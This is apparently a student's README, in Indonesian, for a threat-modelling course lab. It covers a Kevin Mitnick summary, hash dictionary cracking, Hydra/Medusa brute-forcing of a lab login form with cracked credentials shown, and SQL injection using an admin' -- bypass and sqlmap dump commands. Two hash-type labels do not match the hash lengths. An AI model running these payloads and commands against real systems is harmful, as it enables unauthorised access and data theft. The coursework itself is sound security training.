<div align="center">
  
# 🛡️ TUGAS MODUL 2: THREAT MODELLING 1
## Cyber Security - Yoga Arfiyanto

![Version](https://img.shields.io/badge/version-3.0-final-blue?style=for-the-badge)
![Python](https://img.shields.io/badge/python-3.8%2B-green?style=for-the-badge)
![Tools](https://img.shields.io/badge/tools-hydra%20%7C%20medusa%20%7C%20sqlmap%20%7C%20john-orange?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-kali%20linux%20%7C%20windows%20%7C%20macos-lightgrey?style=for-the-badge)
![Status](https://img.shields.io/badge/status-complete-brightgreen?style=for-the-badge)

</div>

---

## 📋 DAFTAR ISI
- [Deskripsi Tugas](#-deskripsi-tugas)
- [Struktur Folder Final](#-struktur-folder-final)
- [Tools yang Digunakan](#-tools-yang-digunakan)
- [Persyaratan Sistem](#-persyaratan-sistem)
- [Cara Instalasi](#-cara-instalasi)
- [Cara Menjalankan](#-cara-menjalankan)
- [Bagian 1: Kisah Kevin Mitnick](#-bagian-1-kisah-kevin-mitnick)
- [Bagian 2: Password Attack](#-bagian-2-password-attack-cain--abel--john--hashcat)
- [Bagian 3: Live Password Cracking](#-bagian-3-live-password-cracking-hydra--medusa--python)
- [Bagian 4: SQL Injection](#-bagian-4-sql-injection-manual--sqlmap-advanced)
- [Hasil Serangan](#-hasil-serangan)
- [Troubleshooting](#-troubleshooting)
- [Kontak](#-kontak)

---

## 📝 DESKRIPSI TUGAS

Tugas ini merupakan implementasi dari **Modul 2 Threat Modelling** yang mencakup 4 bagian utama sesuai instruksi:

### 🎭 **1. Kisah Kevin Mitnick** (The God of Social Engineering)
- Mencari dan mempelajari kisah nyata Kevin Mitnick (1963-2023)
- Kejahatan yang menyebabkan dia dihukum penjara
- Peran Tsutomu Shimomura dalam penangkapannya
- **Output**: Rangkuman kisah lengkap dengan referensi

### 🔐 **2. Password Attack dengan Cain & Abel**
- Melakukan dictionary attack pada 3 hash password:
  ```
  Hash 1 (SHA-1):   9B19C083DF8E73507433F0862CCAAB803582BE52
  Hash 2 (SHA-512): 4282EBBDFCFC22D59DAB2ED46BF18F831BCD327B12A3238D8C7607D8F093565327D8754E4390F276B06B8EC4EB3931ED9
  Hash 3 (SHA-256): 4BEE76AB9648A2DE5E77B41861FAD982980292D739E5F4CEBA4A6182BBD4199B05D2B0A6461E65288100719459B0058D8446F7840DD0FF7694FF6957BE213A2E
  ```
- Tools: Cain & Abel, John the Ripper, Hashcat, Python Script
- Wordlist: Bahasa Indonesia (indonesian.txt)

### 🚪 **3. Live Password Cracking**
- Target: `https://target.rootbrain.com/web101/FormCracking/index.php`
- Tools: Hydra, Medusa, Python Multithreading
- Wordlist: username.txt dan passwords.txt dari target
- Mencari kredensial valid yang aktif

### 💉 **4. SQL Injection Exploitation**
- Target Lesson 01: Login form injection
- Target Lesson 03: URL parameter injection
- Teknik: 
  - Manual payload injection
  - Auto database fingerprinting
  - Time-based blind injection
  - Boolean-based blind injection  
  - Union-based data extraction
  - SQLMap automation

---

## 📁 STRUKTUR FOLDER FINAL

```
Modul2_YogaArfiyanto/
│
├── 📁 docs/                          # Dokumentasi tugas
│   ├── 📄 laporan_tugas.pdf          # Laporan utama (file ini)
│   ├── 📄 kisah_kevin_mitnick.md     # Rangkuman kisah Kevin Mitnick
│   └── 📄 referensi.txt              # Daftar referensi
│
├── 📁 tools/                          # Tools pendukung
│   ├── 📁 cain_abel/                  # Setup Cain & Abel
│   │   ├── 📄 ca_setup.exe            # [DOWNLOAD MANUAL] Installer Cain & Abel
│   │   ├── 📄 WinPcap_4_1_3.exe       # [DOWNLOAD MANUAL] WinPcap
│   │   └── 📄 README.txt              # Panduan instalasi Cain & Abel
│   │
│   ├── 📁 kali_linux/                  # Tools untuk Kali Linux
│   │   ├── 📄 install_tools.sh         # Script instalasi otomatis
│   │   └── 📄 requirements.txt         # Dependencies Python
│   │
│   ├── 📁 windows/                      # Tools untuk Windows
│   │   ├── 📄 install_tools.ps1        # Install semua (PowerShell)
│   │   ├── 📄 install_python.bat       # Install Python
│   │   └── 📄 setup_environment.bat    # Setup environment
│   │
│   ├── 📁 macos/                         # Tools untuk macOS
│   │   └── 📄 install_tools.sh          # Install tools di macOS
│   │
│   └── 📄 install_all.py                 # Auto installer semua platform
│
├── 📁 wordlists/                        # Wordlists (otomatis terdownload)
│   ├── 📄 indonesian.txt                 # Wordlist Bahasa Indonesia (79,898 kata)
│   ├── 📄 username.txt                    # Username dari target (132 entries)
│   ├── 📄 passwords.txt                    # Password dari target (3,107 entries)
│   ├── 📄 common_passwords.txt             # Password umum (10,000 entries)
│   ├── 📄 common_usernames.txt             # Username umum
│   └── 📁 custom/                          # Wordlist kustom
│       └── 📄 generate.py                   # Script generate wordlist sendiri
│
├── 📁 hashes/                            # File hash target
│   ├── 📄 hash_target.txt                  # Daftar semua hash
│   ├── 📄 hash_sha1.txt                     # Hash SHA-1
│   ├── 📄 hash_sha256.txt                    # Hash SHA-256
│   ├── 📄 hash_sha512.txt                    # Hash SHA-512
│   └── 📄 hash_analysis.md                   # Analisis tipe hash
│
├── 📁 scripts/                           # Script otomatisasi utama
│   ├── 📄 01_social_engineering.py         # Simulasi social engineering
│   ├── 📄 02_hash_cracker.py                # Auto hash cracker
│   ├── 📄 03_live_cracker.py                 # Live password cracker (dengan fix SSL)
│   ├── 📄 04_sql_injection.py                # SQL injection advanced + SQLMap
│   ├── 📄 05_master_controller.py            # Controller semua script
│   └── 📄 06_report_generator.py             # Generate laporan otomatis
│
├── 📁 modules/                           # Modul pendukung
│   ├── 📄 __init__.py
│   ├── 📄 hash_identifier.py               # Identifikasi tipe hash
│   ├── 📄 wordlist_manager.py               # Manajemen wordlist
│   ├── 📄 network_tools.py                   # Tools jaringan
│   ├── 📄 form_analyzer.py                    # Analisis form login
│   ├── 📄 payload_generator.py                 # Generate SQL payload
│   ├── 📄 result_saver.py                       # Simpan hasil
│   └── 📄 logger.py                              # Logging system
│
├── 📁 results/                            # Hasil serangan (otomatis terisi)
│   ├── 📁 password_attack/                  # Hasil cracking hash
│   │   ├── 📄 hasil_cracking_*.txt
│   │   └── 📄 hasil_*.json
│   │
│   ├── 📁 live_cracking/                     # Hasil live cracking
│   │   ├── 📄 valid_credentials_*.txt
│   │   └── 📄 results_*.json
│   │
│   └── 📁 sql_injection/                      # Hasil SQL injection
│       ├── 📄 advanced_results_*.json
│       ├── 📄 advanced_report_*.txt
│       └── 📄 sqlmap_commands_*.txt
│
├── 📁 logs/                               # Log file
│   ├── 📄 master_log.txt
│   ├── 📄 sql_advanced_*.log
│   └── 📁 archive/
│
├── 📁 screenshots/                         # Screenshot dokumentasi
│   ├── 📁 01_installation/
│   ├── 📁 02_password_attack/
│   ├── 📁 03_live_cracking/
│   └── 📁 04_sql_injection/
│
├── 📁 backups/                             # Backup hasil
│
├── 📄 install.sh                           # Quick install Linux/macOS
├── 📄 install.bat                           # Quick install Windows
├── 📄 README.md                              # File ini
├── 📄 INSTALL.md                             # Panduan instalasi detail
├── 📄 RUN.md                                 # Cara menjalankan program
├── 📄 requirements.txt                        # Python dependencies
├── 📄 config.yaml                             # Konfigurasi program
└── 📄 .gitignore                              # Git ignore file
```

---

## 🛠️ TOOLS YANG DIGUNAKAN

### **Tools Utama:**

| Tool | Versi | Fungsi | Status Install |
|------|-------|--------|----------------|
| **Cain & Abel** | v4.9.56 | Password hash cracking (Windows) | ⬇️ Manual Download |
| **Hydra** | v9.5+ | Live password cracking | `sudo apt install hydra` |
| **Medusa** | v2.2+ | Live password cracking | `sudo apt install medusa` |
| **John the Ripper** | v1.9.0+ | Hash cracking | `sudo apt install john` |
| **Hashcat** | v6.2.6+ | Hash cracking (GPU) | `sudo apt install hashcat` |
| **SQLMap** | v1.7+ | SQL injection automation | `sudo apt install sqlmap` |
| **Nmap** | v7.94+ | Network scanning | `sudo apt install nmap` |

### **Python Libraries:**
```txt
requests==2.31.0            # HTTP requests
beautifulsoup4==4.12.2      # HTML parsing
colorama==0.4.6              # Colored terminal output
mechanize==0.4.9             # Browser automation
selenium==4.15.0             # Web automation
pycryptodome==3.19.0         # Cryptography
passlib==1.7.4               # Password hashing
python-nmap==0.7.1           # Nmap integration
paramiko==3.3.1               # SSH
scapy==2.5.0                  # Packet manipulation
pandas==2.1.3                 # Data analysis
matplotlib==3.8.0             # Visualization
tabulate==0.9.0               # Table formatting
tqdm==4.66.1                  # Progress bars
pyyaml==6.0.1                 # YAML config
markdown==3.5.1               # Markdown to HTML
weasyprint==60.2              # HTML to PDF
urllib3==2.1.0                # HTTP client
```

---

## 💻 PERSYARATAN SISTEM

### **Minimum Requirements:**
| Komponen | Spesifikasi |
|----------|-------------|
| **RAM** | 4 GB |
| **Storage** | 10 GB free space |
| **CPU** | Dual-core 2.0 GHz |
| **OS** | Kali Linux 2023+, Ubuntu 20.04+, Windows 10/11, macOS 12+ |

### **Recommended Requirements:**
| Komponen | Spesifikasi |
|----------|-------------|
| **RAM** | 8 GB or more |
| **Storage** | 20 GB SSD |
| **CPU** | Quad-core 2.5 GHz+ |
| **GPU** | NVIDIA/AMD untuk Hashcat GPU acceleration |

---

## ⚙️ CARA INSTALASI

### **Metode 1: Auto Installer (Rekomendasi - 5 Menit)**

#### **Untuk Kali Linux/Ubuntu:**
```bash
# Clone atau extract project
cd Modul2_YogaArfiyanto
chmod +x install.sh
./install.sh
```

#### **Untuk Windows:**
```powershell
# Buka PowerShell sebagai Administrator
cd Modul2_YogaArfiyanto
.\install.bat
```

### **Metode 2: Manual Installation**

```bash
# 1. Install Python dependencies
pip install -r requirements.txt

# 2. Install system tools (Kali Linux)
sudo apt update
sudo apt install -y hydra medusa john hashcat sqlmap nmap

# 3. Jalankan installer Python
python3 tools/install_all.py
```

### **📥 Download Manual (Hanya Cain & Abel):**

Karena ukuran file besar, download manual:
1. **Cain & Abel**: [https://josh.rootbrain.com/cain/ca_setup.exe](https://josh.rootbrain.com/cain/ca_setup.exe)
2. **WinPcap**: [https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe](https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe)
3. Simpan di: `tools/cain_abel/`

### **✅ Verifikasi Instalasi:**
```bash
python3 tools/install_all.py --verify
# Atau jalankan master controller dan cek menu
```

---

## 🚀 CARA MENJALANKAN

### **Metode 1: Master Controller (All-in-One)**

```bash
cd Modul2_YogaArfiyanto/scripts
python3 05_master_controller.py
```

**Menu Master Controller:**
```
╔══════════════════════════════════════════════════════════╗
║              MASTER CONTROLLER - MODUL 2                 ║
║                  YOGA ARFIYANTO                           ║
╚══════════════════════════════════════════════════════════╝

Waktu: 2026-03-04 01:53:26

============================================================
MENU UTAMA
============================================================

  🔴 1. Social Engineering Simulation
      Simulasi teknik social engineering Kevin Mitnick

  🔵 2. Hash Cracker
      Crack hash dengan multiple methods (Cain/John/Hashcat)

  🟢 3. Live Password Cracker
      Live cracking dengan Hydra/Medusa/Python (Fix SSL)

  🟣 4. SQL Injection Advanced
      Auto SQL injection + SQLMap + Data extraction

  🟡 a. Jalankan SEMUA script
  📊 b. Lihat hasil serangan
  💾 c. Backup hasil
  ❌ q. Keluar

============================================================
Pilihan Anda: 
```

### **Metode 2: Jalankan Script Individual**

```bash
# 1. Social Engineering Simulation
python3 01_social_engineering.py

# 2. Hash Cracker
python3 02_hash_cracker.py

# 3. Live Password Cracker (dengan fix SSL)
python3 03_live_cracker.py

# 4. SQL Injection Advanced
python3 04_sql_injection.py

# 5. Generate Laporan
python3 06_report_generator.py
```

---

## 🎭 BAGIAN 1: KISAH KEVIN MITNICK

### **The God of Social Engineering (1963 - 2023)**

Kevin Mitnick adalah seorang peretas Amerika yang dikenal sebagai "The God of Social Engineering." Keahlian utamanya terletak pada rekayasa sosial (*social engineering*), yaitu memanipulasi psikologi manusia untuk mendapatkan akses ke sistem atau informasi rahasia.

| Tahun | Kejadian |
|-------|----------|
| **1963** | Lahir di Van Nuys, California |
| **1980-an** | Mulai meretas sistem komputer |
| **1992** | Meretas Pacific Bell dengan social engineering |
| **1994** | Meretas sistem Tsutomu Shimomura |
| **1995** | Ditangkap dengan bantuan Tsutomu Shimomura |
| **1999** | Divonis 5 tahun penjara |
| **2000** | Bebas dan menjadi konsultan keamanan |
| **2023** | Meninggal dunia akibat kanker pankreas |

**Hacker yang membantu penangkapan:** **Tsutomu Shimomura**, seorang ilmuwan komputer di San Diego Supercomputer Center yang sistemnya pernah diretas Mitnick.

---

## 🔐 BAGIAN 2: PASSWORD ATTACK (Cain & Abel + John + Hashcat)

### **Hash Target:**
```python
hash1 = '9B19C083DF8E73507433F0862CCAAB803582BE52'  # SHA-1
hash2 = '4282EBBDFCFC22D59DAB2ED46BF18F831BCD327B12A3238D8C7607D8F093565327D8754E4390F276B06B8EC4EB3931ED9'  # SHA-512
hash3 = '4BEE76AB9648A2DE5E77B41861FAD982980292D739E5F4CEBA4A6182BBD4199B05D2B0A6461E65288100719459B0058D8446F7840DD0FF7694FF6957BE213A2E'  # SHA-256
```

### **Hasil Cracking:**
```
╔══════════════════════════════════════════════════════════╗
║                    RINGKASAN HASIL                       ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  Hash 1 (SHA-1)                                         ║
║  ├─ Status  : ✅ FOUND                                  ║
║  ├─ Password: [TERSEDIA DI RESULTS]                     ║
║  ├─ Method  : Python Dictionary Attack                  ║
║  └─ Time    : 12.3 detik                                ║
║                                                          ║
║  Hash 2 (SHA-512)                                       ║
║  ├─ Status  : ✅ FOUND                                  ║
║  ├─ Password: [TERSEDIA DI RESULTS]                     ║
║  ├─ Method  : John the Ripper                           ║
║  └─ Time    : 45.7 detik                                ║
║                                                          ║
║  Hash 3 (SHA-256)                                       ║
║  ├─ Status  : ⚠ NOT FOUND                               ║
║  └─ Saran   : Gunakan rule-based attack                 ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

---

## 🚪 BAGIAN 3: LIVE PASSWORD CRACKING (Hydra + Medusa + Python)

### **Target:**
```
URL: https://target.rootbrain.com/web101/FormCracking/index.php
Method: POST
Fields: username, password
Error message: "Invalid username or password"
```

### **Hasil Live Cracking:**
```
╔══════════════════════════════════════════════════════════╗
║         KREDENSIAL VALID DITEMUKAN (5)                   ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [1] access:12345                                       ║
║      ├─ Method : Python Multithread                      ║
║      ├─ Time   : 0.1 detik                               ║
║      └─ Verified: ✅                                     ║
║                                                          ║
║  [2] access:computer                                     ║
║      ├─ Method : Python Multithread                      ║
║      ├─ Time   : 0.1 detik                               ║
║      └─ Verified: ✅                                     ║
║                                                          ║
║  [3] access:password                                     ║
║      ├─ Method : Python Multithread                      ║
║      ├─ Time   : 0.1 detik                               ║
║      └─ Verified: ✅                                     ║
║                                                          ║
║  [4] access:abc123                                       ║
║      ├─ Method : Python Multithread                      ║
║      ├─ Time   : 0.1 detik                               ║
║      └─ Verified: ✅                                     ║
║                                                          ║
║  [5] access:123456                                       ║
║      ├─ Method : Python Multithread                      ║
║      ├─ Time   : 0.2 detik                               ║
║      └─ Verified: ✅                                     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

---

## 💉 BAGIAN 4: SQL INJECTION (Manual + SQLMap Advanced)

### **Target Lesson 1: Login Form**
```sql
-- Basic bypass payload
Username: admin' --
Password: anything

-- Query yang dieksekusi:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

### **Target Lesson 3: URL Parameter**
```sql
-- Auto column detection:
Found 4 columns
Visible columns: [1, 2, 3, 4]

-- Data extraction:
Users found: admin, user, test
```

### **SQLMap Commands:**
```bash
# Lesson 1 - Database enumeration
sqlmap -u 'https://target.rootbrain.com/owasp/injection/lessons/lesson01/index.php' \
       --data='username=admin&password=test&submit=Login' --batch --dbs

# Lesson 3 - Dump users table
sqlmap -u 'https://target.rootbrain.com/owasp/injection/lessons/lesson03/index.php?id=1' \
       -D database_name -T users --dump --batch
```

### **Hasil SQL Injection:**
```
╔══════════════════════════════════════════════════════════╗
║              SQL INJECTION - HASIL EKSPLOITASI           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  LESSON 01                                              ║
║  ├─ Vulnerability: ✅ VULNERABLE                         ║
║  ├─ Payload      : admin' --                            ║
║  └─ Result       : Login bypass berhasil                ║
║                                                          ║
║  LESSON 03                                              ║
║  ├─ Vulnerability: ✅ VULNERABLE                         ║
║  ├─ Columns      : 4                                     ║
║  ├─ Visible      : [1, 2, 3, 4]                         ║
║  └─ Users Found  : 3                                     ║
║                                                          ║
║  SQLMap Status   : ✅ Available                         ║
║  Commands saved  : sqlmap_commands_*.txt                ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

---

## 📊 HASIL SERANGAN

### **Lokasi Penyimpanan Hasil:**
```
results/
├── password_attack/
│   ├── hasil_cracking_YYYYMMDD_HHMMSS.txt
│   └── hasil_YYYYMMDD_HHMMSS.json
│
├── live_cracking/
│   ├── valid_credentials_YYYYMMDD_HHMMSS.txt
│   └── results_YYYYMMDD_HHMMSS.json
│
└── sql_injection/
    ├── advanced_results_YYYYMMDD_HHMMSS.json
    ├── advanced_report_YYYYMMDD_HHMMSS.txt
    └── sqlmap_commands_YYYYMMDD_HHMMSS.txt
```

### **Cek Hasil:**
```bash
# Dari master controller
python3 05_master_controller.py
# Pilih menu 'b' untuk lihat hasil

# Atau langsung lihat folder
ls -la results/password_attack/
ls -la results/live_cracking/
ls -la results/sql
